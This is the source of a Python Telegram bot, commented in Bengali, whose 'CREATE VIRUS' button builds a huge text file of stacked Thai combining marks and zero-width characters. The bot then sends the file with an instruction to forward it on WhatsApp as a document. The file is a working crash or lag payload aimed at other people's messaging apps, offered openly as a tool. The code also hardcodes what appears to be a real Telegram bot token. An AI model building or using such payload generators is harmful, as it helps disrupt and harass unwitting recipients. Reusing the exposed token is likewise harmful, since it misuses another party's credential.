import logging
import sqlite3
import os
import asyncio
import time
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, MessageHandler, filters, ContextTypes

# ১. ক্লিন লগিং
logging.basicConfig(level=logging.WARNING)

# ২. কনফিগারেশন
TOKEN = "8675593212:AAG6_m5ZFEqG-qkutygxbuoOetMv9N87TnY"

# ৩. ডাটাবেস
def init_db():
    conn = sqlite3.connect('mr_dev_final_fixed.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. সুপার পাওয়ারফুল পেলোড জেনারেটর (মেশিন গান লজিক)
async def generate_virus_payload(status_msg):
    filename = f"VIRUS_{int(time.time())}.txt"
    # অত্যন্ত শক্তিশালী হেক্স এবং ইউনিকোড প্যাটার্ন
    # এটি ফাইল সাইজ কম রাখে কিন্তু প্রসেসিং ক্ষমতা অনেক বেশি
    pattern = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 100
    invisible = "\u200B\u200C\u200D\uFEFF" * 50
    payload_data = (pattern + invisible + "☠️MR_DEV☠️") * 500
    
    try:
        await status_msg.edit_text("⏳ পেলোড ডাটা জেনারেট হচ্ছে...")
        # ফাইলটি রাইট করা হচ্ছে
        with open(filename, "w", encoding="utf-8") as f:
            for _ in range(400): 
                f.write(payload_data)
        
        await status_msg.edit_text("🚀 ১০০% সম্পন্ন! এখনই ফাইলটি পাঠানো হচ্ছে...")
        return filename
    except Exception as e:
        print(f"Error: {e}")
        return None

# ৫. মেইন হ্যান্ডলার
async def handle_requests(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text: return
    text = update.message.text
    user_name = update.effective_user.first_name

    # স্টার্ট মেনু
    if text == "/start":
        keyboard = [[KeyboardButton("🚀 CREATE VIRUS")], [KeyboardButton("📊 STATUS")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(
            f"🔥 **M R DEVELOPER PRO PANEL** 🔥\n\nস্বাগতম {user_name}! আমি প্রস্তুত।",
            reply_markup=reply_markup
        )

    # ভাইরাস তৈরির বাটন
    elif text == "🚀 CREATE VIRUS":
        status_msg = await update.message.reply_text("🚀 মিশন শুরু হয়েছে...")
        file_path = await generate_virus_payload(status_msg)
        
        if file_path and os.path.exists(file_path):
            try:
                # ফাইল পাঠানো (টাইমআউট অনেক বাড়ানো হয়েছে)
                with open(file_path, 'rb') as doc:
                    await update.message.reply_document(
                        document=doc, 
                        caption="✅ **M R DEV VIRUS READY!**\n\nএটি হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে পাঠান।",
                        read_timeout=300, # ৫ মিনিট পর্যন্ত অপেক্ষা করবে
                        write_timeout=300,
                        connect_timeout=300
                    )
                
                # পরিসংখ্যান আপডেট
                conn = sqlite3.connect('mr_dev_final_fixed.db')
                cur = conn.cursor()
                cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                conn.commit()
                conn.close()
            except Exception as e:
                await update.message.reply_text("❌ ডেলিভারি এরর! রেলওয়ে সার্ভার ওভারলোড। আবার ট্রাই করুন।")
            finally:
                if os.path.exists(file_path): os.remove(file_path)
        else:
            await update.message.reply_text("❌ ফাইল তৈরিতে সমস্যা হয়েছে।")
        
        await status_msg.delete()

    # স্ট্যাটাস চেক
    elif text == "📊 STATUS":
        conn = sqlite3.connect('mr_dev_final_fixed.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total = cur.fetchone()[0]
        conn.close()
        await update.message.reply_text(f"📊 মোট তৈরি ভাইরাস: {total} টি।")

# ৬. রানার
def main():
    init_db()
    # drop_pending_updates=True কনফ্লিক্ট এরর ফিক্স করবে
    application = Application.builder().token(TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT, handle_requests))
    
    print("---------------------------------------")
    print("M R DEVELOPER Bot is Live & 100% Ready!")
    print("---------------------------------------")
    
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
    
